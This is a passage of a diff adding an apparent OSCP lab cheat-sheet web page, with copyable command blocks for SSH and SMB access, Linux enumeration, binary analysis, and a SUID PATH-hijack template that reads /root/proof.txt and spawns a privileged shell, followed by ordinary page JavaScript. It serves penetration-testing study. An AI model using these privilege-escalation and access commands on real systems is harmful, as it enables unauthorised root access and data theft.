+</pre></div>
+<hr />
+<h3>SSH</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>id_rsa<span class="w">                                  </span><span class="c1"># comment names the user</span>
+
+<span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+<span class="c1">## run a whole enumeration script in one connection</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<hr />
+<h3>SMB</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'get file.txt'</span>
+</pre></div>
+<hr />
+<h3>Linux local enumeration</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+
+<span class="c1">## SUID without tripling the output on snap</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
+
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span><span class="w">    </span><span class="c1"># setgid</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
+ss<span class="w"> </span>-tlnp
+ls<span class="w"> </span>-la<span class="w"> </span>/home/*<span class="w"> </span>/opt<span class="w"> </span>/srv<span class="w"> </span>/var/www
+find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>local.txt<span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span>proof.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</pre></div>
+<hr />
+<h3>Binary analysis</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># "not stripped" = function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
+</pre></div>
+<p>Reconstructing source from a small binary:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">+ setuid / setgid  →  setuid(0); setgid(0);
++ lea rdi,[rip+...] →  the argument is a fixed string
++ call system@plt  →  system("...")</span></pre></div>
+<hr />
+<h3>Privesc — PATH hijack template</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">id &gt; /tmp/root_id.txt</span>
+<span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
+<span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+
+<span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+
+cat<span class="w"> </span>/tmp/root_id.txt
+</pre></div>
+<p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
+not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
+<p>Interactive variant:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\n/bin/bash -p\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+</pre></div>
+<hr />
+<h3>Cleanup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">"No such file or directory"</span>
+</pre></div></div></section>
+
+    <footer>
+      <span>Authorised lab environment · flags and credentials are lab-specific</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 27 November 2026</span>
+    </footer>
+  </main>
+</div>
+
+<button id="toTop" type="button" aria-label="Back to top">↑</button>
+<div id="toast" role="status" aria-live="polite"></div>
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement;
+
+  /* ---------- theme ---------- */
+  var THEME_KEY="oscp-theme";
+  function setTheme(t){root.setAttribute("data-theme",t);try{localStorage.setItem(THEME_KEY,t)}catch(e){}}
+  var saved=null;try{saved=localStorage.getItem(THEME_KEY)}catch(e){}
+  if(!saved){saved=window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches?"light":"dark";}
+  setTheme(saved);
+  document.getElementById("themeBtn").addEventListener("click",function(){
+    setTheme(root.getAttribute("data-theme")==="dark"?"light":"dark");
+  });
+
+  /* ---------- wrap h3 sections into collapsible cards ---------- */
+  document.querySelectorAll(".content").forEach(function(content){
+    var kids=Array.prototype.slice.call(content.children);
+    var current=null, sec=null, body=null;
+    kids.forEach(function(el){
+      if(el.tagName==="H3"){
+        sec=document.createElement("section");sec.className="sec";
+        var btn=document.createElement("button");
+        btn.type="button";btn.className="sec-head";btn.setAttribute("aria-expanded","true");
+        btn.textContent=el.textContent;
+        body=document.createElement("div");body.className="sec-body";
+        content.insertBefore(sec,el);
+        sec.appendChild(btn);sec.appendChild(body);
+        el.remove();
+        btn.addEventListener("click",function(){
+          var panel=btn.nextElementSibling;
+          var open=btn.getAttribute("aria-expanded")==="true";
+          btn.setAttribute("aria-expanded",open?"false":"true");
+          if(panel)panel.hidden=open;
+        });
+        current=body;
+      }else if(current){
+        current.appendChild(el);
+      }
+    });
+  });
+
+  /* ---------- copy buttons ---------- */
+  var toast=document.getElementById("toast"),toastTimer=null;
+  function say(msg){
+    toast.textContent=msg;toast.classList.add("show");
+    clearTimeout(toastTimer);toastTimer=setTimeout(function(){toast.classList.remove("show")},1600);
+  }
+  function copy(text,btn){
+    function ok(){if(btn){btn.classList.add("done");var t=btn.textContent;btn.textContent="Copied";
+      setTimeout(function(){btn.classList.remove("done");btn.textContent=t},1400);}say("Copied to clipboard");}
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(text).then(ok).catch(function(){fallback(text);ok();});
+    }else{fallback(text);ok();}
+  }
+  function fallback(text){
+    var ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";
+    document.body.appendChild(ta);ta.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(ta);
+  }
+  document.addEventListener("click",function(e){
+    var btn=e.target.closest(".copy");
+    if(!btn)return;
+    var block=btn.closest(".block"),pre=block&&block.querySelector("pre");
+    if(pre)copy(pre.innerText.replace(/\s+$/,""),btn);
+  });
+
+  /* copy every command in a chapter */
+  document.querySelectorAll(".copyall").forEach(function(btn){
+    btn.addEventListener("click",function(){
+      var ch=btn.closest(".chapter");
+      var cmds=Array.prototype.map.call(ch.querySelectorAll(".block-cmd pre"),function(p){return p.innerText.replace(/\s+$/,"")});
+      if(!cmds.length){say("No commands in this chapter");return;}
+      copy(cmds.join("\n\n"),btn);
+    });
+  });
+
+  /* ---------- progress ---------- */
+  var PKEY="oscp-progress-lx-nfs-3";
+  var checks=Array.prototype.slice.call(document.querySelectorAll(".nav-check"));
+  var done={};try{done=JSON.parse(localStorage.getItem(PKEY)||"{}")}catch(e){}
+  function paint(){
+    var n=0;
+    checks.forEach(function(c){
+      var on=!!done[c.dataset.ch];
+      c.checked=on;
+      c.closest(".nav-item").classList.toggle("done",on);
+      if(on)n++;
+    });
+    var pct=Math.round(n/checks.length*100);
+    document.getElementById("bar").style.width=pct+"%";
+    document.getElementById("pcount").textContent=n+" / "+checks.length;
+    document.getElementById("ppct").textContent=pct+"%";
+  }
+  checks.forEach(function(c){
+    c.addEventListener("click",function(e){e.stopPropagation()});
+    c.addEventListener("change",function(){
+      done[c.dataset.ch]=c.checked;
+      try{localStorage.setItem(PKEY,JSON.stringify(done))}catch(e){}
+      paint();
+    });
+  });
+  paint();
+  document.getElementById("resetProgress").addEventListener("click",function(){
+    done={};try{localStorage.setItem(PKEY,"{}")}catch(e){}paint();say("Progress reset");
+  });
+
+  /* ---------- expand / collapse all ---------- */
+  function setAll(open){
+    document.querySelectorAll(".sec-head").forEach(function(b){
+      b.setAttribute("aria-expanded",open?"true":"false");
+      b.nextElementSibling.hidden=!open;
+    });
+  }
+  document.getElementById("expandAll").addEventListener("click",function(){setAll(true)});
+  document.getElementById("collapseAll").addEventListener("click",function(){setAll(false)});
+
+  /* ---------- scroll spy ---------- */
+  var navItems=Array.prototype.slice.call(document.querySelectorAll(".nav-item"));
+  var chapters=Array.prototype.slice.call(document.querySelectorAll(".chapter"));
+  if("IntersectionObserver" in window){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(!en.isIntersecting)return;
+        navItems.forEach(function(n){n.classList.toggle("active",n.dataset.target===en.target.id)});
+      });
+    },{rootMargin:"-70px 0px -70% 0px",threshold:0});
+    chapters.forEach(function(c){io.observe(c)});
+  }
+
+  /* ---------- search ---------- */
+  var input=document.getElementById("search"),count=document.getElementById("searchCount");
+  var index=chapters.map(function(c){
+    return {el:c,item:document.querySelector('.nav-item[data-target="'+c.id+'"]'),
+            text:(c.dataset.title+" "+c.textContent).toLowerCase()};
+  });
+  function clearMarks(){
+    document.querySelectorAll("mark.hit").forEach(function(m){
+      var p=m.parentNode;m.replaceWith(document.createTextNode(m.textContent));p.normalize();
+    });
+  }
+  function run(){
+    var q=input.value.trim().toLowerCase();
+    clearMarks();
+    if(!q){
+      index.forEach(function(r){r.item.style.display="";r.el.style.display=""});
+      count.textContent="";return;
+    }
+    var hits=0,first=null;
+    index.forEach(function(r){
+      var hit=r.text.indexOf(q)!==-1;
+      r.item.style.display=hit?"":"none";
+      r.el.style.display=hit?"":"none";
+      if(hit){hits++;if(!first)first=r;}
+    });
+    count.textContent=hits?hits+" chapter"+(hits>1?"s":""):"no match";
+    if(first&&hits===1){first.el.scrollIntoView({block:"start"});}
+  }
+  var t=null;
+  input.addEventListener("input",function(){clearTimeout(t);t=setTimeout(run,140)});
+  input.addEventListener("keydown",function(e){
+    if(e.key==="Escape"){input.value="";run();input.blur();}
+    if(e.key==="Enter"){var vis=index.filter(function(r){return r.item.style.display!=="none"});if(vis.length){vis[0].el.scrollIntoView({block:"start"})}}
+  });
+
+  /* ---------- keyboard ---------- */
+  document.addEventListener("keydown",function(e){
+    var typing=/^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
+    if(e.key==="/"&&!typing){e.preventDefault();input.focus();input.select();}
+  });
+
+  /* ---------- mobile sidebar ---------- */
+  var sidebar=document.getElementById("sidebar");
+  document.getElementById("burger").addEventListener("click",function(){sidebar.classList.toggle("open")});
+  navItems.forEach(function(n){n.addEventListener("click",function(){sidebar.classList.remove("open")})});
+
+  /* ---------- flag reveal ---------- */
+  document.querySelectorAll(".flag .reveal").forEach(function(b){
+    b.addEventListener("click",function(){
+      var flag=b.closest(".flag"),v=flag.querySelector(".v");
+      var val=v.dataset.value;
+      var on=flag.classList.toggle("revealed");
+      v.innerHTML=on?'<span>'+val+'</span>':'<span class="masked">••••••••••••••••••••••••••••••••</span>';
+      b.textContent=on?"hide":"reveal";
+    });
+  });
+
+  /* ---------- back to top ---------- */
+  var topBtn=document.getElementById("toTop");
+  window.addEventListener("scroll",function(){
+    topBtn.classList.toggle("show",window.scrollY>600);
+  },{passive:true});
+  topBtn.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})});
+
+  /* ---------- deep links ---------- */
+  if(location.hash){
+    var target=document.querySelector(location.hash);
+    if(target)setTimeout(function(){target.scrollIntoView({block:"start"})},60);
+  }
+})();
+</script>
+</body>
+</html>
